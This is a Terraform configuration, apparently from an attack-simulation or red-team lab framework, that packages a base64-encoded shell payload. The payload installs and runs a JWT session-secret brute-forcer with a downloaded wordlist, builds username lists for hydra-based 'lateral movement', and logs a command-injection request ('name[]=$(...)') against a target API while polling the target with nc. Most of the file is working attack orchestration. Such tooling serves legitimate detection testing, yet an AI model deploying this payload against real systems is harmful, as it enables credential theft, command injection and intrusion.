locals {
    exploit_script = "bruteforce_session.py"
    usernames_script = "generate_usernames.py"
    attack_dir = "/authapp_attack"
    target_ip=var.inputs["target_ip"]
    target_port=var.inputs["target_port"]
    payload = <<-EOT
    log "cleaning app directory"
    rm -rf ${local.attack_dir}
    mkdir -p ${local.attack_dir}
    cd ${local.attack_dir}
    echo ${local.exploit} | base64 -d > ${local.exploit_script}
    echo ${local.usernames} | base64 -d > ${local.usernames_script} 
    echo ${local.requirements} | base64 -d > requirements.txt
    log "installing required python3.9..."
    apt-get install -y python3.9 python3.9-venv >> $LOGFILE 2>&1
    curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py >> $LOGFILE 2>&1
    python3.9 get-pip.py >> $LOGFILE 2>&1
    log "wait before using module..."
    sleep 5
    python3.9 -m pip install -U pip setuptools wheel setuptools_rust jinja2 jc
    log "installing exploit requirements..."
    python3.9 -m pip install --ignore-installed -r requirements.txt
    
    curl -LJ https://raw.githubusercontent.com/danielmiessler/SecLists/89e486bd4e1bcd1bd3fc565216097a8d389f3983/Passwords/scraped-JWT-secrets.txt -o /tmp/scraped-JWT-secrets.txt

    START_HASH=$(sha256sum --text /tmp/payload_$SCRIPTNAME | awk '{ print $1 }')
    while true; do
        log "starting script..."
        log "payload: curl --get --verbose \"http://${local.target_ip}:${local.target_port}/api/getServices\" --data-urlencode 'name[]=\$(${var.inputs["payload"]})'"
        log "checking target: ${local.target_ip}:${local.target_port}"
        while ! nc -z -w 5 -vv ${local.target_ip} ${local.target_port} > /dev/null; do
            log "failed check - waiting for target";
            sleep 30;
        done;
        log "target available - sending payload";
        sleep 5;
        
        # brute force the session password
        python3.9 ${local.exploit_script} --host=${local.target_ip} --port=${local.target_port} --password-list=/tmp/scraped-JWT-secrets.txt --output-password-list=/tmp/hydra-password.txt >/dev/null 2>&1 &

        # prep for second stage below providing usernames and password for lateral movement        

        # result is hydra-password list but we need a user list
        python3.9 ${local.usernames_script} --first=${var.inputs["compromised_user_first_name"]} --last=${var.inputs["compromised_user_last_name"]} --output=/tmp/hydra-users.txt
        
        log 'waiting 30 minutes...';
        sleep 1800
        CHECK_HASH=$(sha256sum --text /tmp/payload_$SCRIPTNAME | awk '{ print $1 }')
        if [ "$CHECK_HASH" != "$START_HASH" ]; then
            log "payload update detected - exiting loop"
            break
        else
            log "restarting loop..."
            log "waiting ${var.inputs["attack_delay"]} seconds...";
            sleep ${var.inputs["attack_delay"]}
        fi
    done
    log "Done."
    EOT


    exploit         = base64encode(file(
                                "${path.module}/resources/bruteforce_session.py", 
                            ))
    requirements    = base64encode(file(
                                "${path.module}/resources/requirements.txt", 
                            ))
    usernames       = base64encode(file(
                                "${path.module}/resources/generate_usernames.py", 
                            ))

    base64_payload = templatefile("${path.root}/modules/common/any/payload/linux/delayed_start.sh", { config = {
        script_name = var.inputs["tag"]
        log_rotation_count = 2
        apt_pre_tasks = ""
        apt_packages = ""
        apt_post_tasks = ""
        yum_pre_tasks =  ""
        yum_packages = ""
        yum_post_tasks = ""
        script_delay_secs = var.inputs["attack_delay"]
        next_stage_payload = local.payload
    }})

    outputs = {
        base64_payload = base64gzip(local.base64_payload)
        base64_uncompressed_payload = base64encode(local.base64_payload)
        base64_uncompressed_payload_additional = []
    }
}

